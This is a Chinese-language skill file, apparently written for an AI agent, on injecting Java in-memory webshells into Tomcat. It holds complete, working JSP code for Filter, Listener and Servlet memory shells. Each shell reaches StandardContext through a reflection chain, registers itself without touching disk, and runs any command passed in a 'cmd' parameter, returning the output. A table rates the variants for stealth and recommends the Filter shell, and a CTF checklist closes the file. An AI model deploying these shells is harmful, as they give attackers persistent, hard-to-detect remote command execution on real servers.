---
name: java-memory-shell
description: Use when encountering java内存马技术 - Filter/Listener/Servlet三种内存马的注入原理、反射链、持久化驻留
---

# Java内存马

## Info

- **Tags**: java, tomcat, memory-shell, persistence, webshell
- **适用环境**: Tomcat 容器，已有 JSP 上传或反序列化入口

## 注入核心路径

所有类型内存马的注入流程都遵循：

```
ServletContext → ApplicationContext → StandardContext → 注册组件
```

关键反射链：
```java
// 1. 获取 StandardContext
ServletContext sc = request.getServletContext();
Field appctx = sc.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext ac = (ApplicationContext) appctx.get(sc);
Field stdctx = ac.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(ac);
```

---

## 1. Filter 内存马（推荐）

**特点**: 请求到达 Servlet 前拦截，优先级最高，最常用

```jsp
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%
  final String name = "filter";
  ServletContext servletContext = request.getServletContext();

  // 反射获取 StandardContext
  Field appctx = servletContext.getClass().getDeclaredField("context");
  appctx.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
  Field stdctx = applicationContext.getClass().getDeclaredField("context");
  stdctx.setAccessible(true);
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

  // 获取 filterConfigs
  Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
  Configs.setAccessible(true);
  Map filterConfigs = (Map) Configs.get(standardContext);

  if (filterConfigs.get(name) == null) {
    // 创建恶意 Filter
    Filter filter = new Filter() {
      public void init(FilterConfig fc) {}
      public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
          throws IOException, ServletException {
        HttpServletRequest lr = (HttpServletRequest) req;
        HttpServletResponse lres = (HttpServletResponse) res;
        if (lr.getParameter("cmd") != null) {
          Process p = Runtime.getRuntime().exec(lr.getParameter("cmd"));
          java.io.BufferedReader br = new java.io.BufferedReader(
              new java.io.InputStreamReader(p.getInputStream()));
          StringBuilder sb = new StringBuilder();
          String line;
          while ((line = br.readLine()) != null) sb.append(line).append('\n');
          lres.getOutputStream().write(sb.toString().getBytes());
          lres.getOutputStream().flush();
          lres.getOutputStream().close();
          return;
        }
        chain.doFilter(req, res);
      }
      public void destroy() {}
    };

    // 注册 FilterDef
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    // 注册 FilterMap
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);

    // 创建 FilterConfig
    Constructor constructor = ApplicationFilterConfig.class
        .getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig =
        (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
    filterConfigs.put(name, filterConfig);
  }
%>
```

**访问**: `http://target/任意路径?cmd=id`

---

## 2. Listener 内存马

**特点**: 更隐蔽，每次请求都会触发，但回显较复杂

### 基础版（不可回显）

```jsp
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="javax.servlet.*" %>
<%
  // 获取 StandardContext
  ServletContext sc = request.getSession().getServletContext();
  Field f1 = sc.getClass().getDeclaredField("context");
  f1.setAccessible(true);
  ApplicationContext ac = (ApplicationContext) f1.get(sc);
  Field f2 = ac.getClass().getDeclaredField("context");
  f2.setAccessible(true);
  StandardContext stdCtx = (StandardContext) f2.get(ac);

  // 创建并注册 Listener
  ServletRequestListener listener = new ServletRequestListener() {
    public void requestInitialized(ServletRequestEvent e) {
      String cmd = e.getServletRequest().getParameter("cmd");
      if (cmd != null) {
        Runtime.getRuntime().exec(cmd);
      }
    }
    public void requestDestroyed(ServletRequestEvent e) {}
  };
  stdCtx.addApplicationEventListener(listener);
%>
```

### 可回显版（通过反射获取 response）

```jsp
<%
public class EvilListener implements ServletRequestListener {
    public void requestInitialized(ServletRequestEvent sre) {
        ServletRequest sr = sre.getServletRequest();
        String cmd = sr.getParameter("cmd");
        if (cmd != null) {
            try {
                // 反射获取 response 对象
                Field reqField = sr.getClass().getDeclaredField("request");
                reqField.setAccessible(true);
                Object realReq = reqField.get(sr);
                Field respField = realReq.getClass().getDeclaredField("response");
                respField.setAccessible(true);
                HttpServletResponse resp = (HttpServletResponse) respField.get(realReq);

                // 执行命令并回显
                Process p = Runtime.getRuntime().exec(cmd);
                java.util.Scanner scanner = new java.util.Scanner(
                    p.getInputStream()).useDelimiter("\\A");
                String result = scanner.hasNext() ? scanner.next() : "";
                resp.setContentType("text/html;charset=UTF-8");
                resp.getWriter().write(result);
            } catch (Exception ex) { throw new RuntimeException(ex); }
        }
    }
    public void requestDestroyed(ServletRequestEvent sre) {}
}

// 注册
// ... StandardContext 获取同上
standardContext.addApplicationEventListener(new EvilListener());
%>
```

---

## 3. Servlet 内存马

**特点**: 需要指定 URL 路径，结构最清晰

```jsp
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="org.apache.catalina.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="java.io.*" %>
<%
  // 获取 StandardContext
  ServletContext sc = request.getServletContext();
  Field f1 = sc.getClass().getDeclaredField("context");
  f1.setAccessible(true);
  ApplicationContext ac = (ApplicationContext) f1.get(sc);
  Field f2 = ac.getClass().getDeclaredField("context");
  f2.setAccessible(true);
  StandardContext stdCtx = (StandardContext) f2.get(ac);

  final String servletName = "evilServlet";
  final String urlPattern = "/evil";

  if (stdCtx.findChild(servletName) == null) {
    // 创建 Wrapper
    Wrapper wrapper = stdCtx.createWrapper();
    wrapper.setName(servletName);
    wrapper.setServletClass(EvilServlet.class.getName());
    wrapper.setServlet(new EvilServlet());
    wrapper.setLoadOnStartup(1);
    stdCtx.addChild(wrapper);
    stdCtx.addServletMappingDecoded(urlPattern, servletName);
    out.println("Servlet 注入成功! 访问: " + urlPattern + "?cmd=id");
  }

  // 恶意 Servlet 类
  class EvilServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {
      String cmd = req.getParameter("cmd");
      if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append('\n');
        resp.getWriter().write(sb.toString());
      }
    }
    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException { doGet(req, resp); }
  }
%>
```

---

## 对比

| 类型 | 优先级 | 回显 | 隐蔽性 | 推荐度 |
|------|--------|------|--------|--------|
| Filter | 最高（Servlet前拦截） | 容易 | 中 | ★★★★★ |
| Listener | 中 | 需反射获取response | 高 | ★★★ |
| Servlet | 最低（需指定URL） | 容易 | 低 | ★★★★ |

## CTF 检查清单

- [ ] 是否已有 JSP 上传入口
- [ ] 是否存在反序列化入口（readObject / JSON.parseObject 等）
- [ ] 目标是否为 Tomcat 容器（StandardContext 反射链）
- [ ] 是否有其他框架（Spring Boot 需用 ApplicationContext 不同反射链）
- [ ] 注入后是否被 WAF/安全组件拦截
